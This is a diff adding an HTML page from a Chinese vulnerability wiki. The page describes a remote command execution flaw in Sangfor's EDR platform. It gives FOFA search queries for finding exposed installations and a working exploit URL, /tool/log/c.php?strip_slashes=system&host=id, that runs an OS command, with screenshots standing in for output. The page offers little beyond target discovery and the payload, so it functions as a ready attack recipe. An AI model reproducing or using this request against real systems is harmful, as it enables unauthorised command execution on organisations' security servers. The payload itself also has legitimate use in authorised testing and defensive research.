@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E7%A7%91%E6%8A%80EDR/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>深信服EDR平台存在远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6df1\u4fe1\u670dEDR\u5e73\u53f0\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8iDS%E8%81%94%E7%BD%91%E6%95%B0%E5%AD%97%E6%A0%87%E7%89%8C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8iDS%E8%81%94%E7%BD%91%E6%95%B0%E5%AD%97%E6%A0%87%E7%89%8C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        深圳亮钻科技有限公司iDS联网数字标牌管理系统存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        深信服EDR平台存在任意用户登录漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="edr">深信服EDR平台存在远程命令执行漏洞<a class="headerlink" href="#edr" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>深信服终端检测响应平台EDR,通过云网端联动协同、威胁情报共享、多层级响应机制,帮助用户快速处置终端安全问题,构建轻量级、智能化、响应快的下一代终端安全系统。深信服终端监测响应平台（EDR）存在远程命令执行漏洞。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>深信服EDR</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>&lt;font style="color:rgba(0, 0, 0, 0.9);"&gt;app="SANGFOR-EDR"&lt;/font&gt;``&lt;font style="color:rgba(0, 0, 0, 0.9);"&gt;title="终端检测响应平台"&lt;/font&gt;</code></li>
+</ul>
+<p><img alt="1716179568863-6a3ef6e1-44be-4250-a0b9-6e869186adc6.png" src="./img/SSNDnO_IRu30np4k/1716179568863-6a3ef6e1-44be-4250-a0b9-6e869186adc6-578437.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>/tool/log/c.php?strip_slashes=system&amp;host=id
+</code></pre></div>
+<p><img alt="1716179905089-bcaa2ab3-5127-42cb-8f89-09f79a843007.png" src="./img/SSNDnO_IRu30np4k/1716179905089-bcaa2ab3-5127-42cb-8f89-09f79a843007-377633.png" /></p>
+<blockquote>
+<p>更新: 2024-05-23 13:32:28<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/bw1hyzgtaebgmp4x">https://www.yuque.com/xiaokp7/ocvun2/bw1hyzgtaebgmp4x</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8iDS%E8%81%94%E7%BD%91%E6%95%B0%E5%AD%97%E6%A0%87%E7%89%8C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%B7%B1%E5%9C%B3%E4%BA%AE%E9%92%BB%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8iDS%E8%81%94%E7%BD%91%E6%95%B0%E5%AD%97%E6%A0%87%E7%89%8C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        深圳亮钻科技有限公司iDS联网数字标牌管理系统存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        深信服EDR平台存在任意用户登录漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
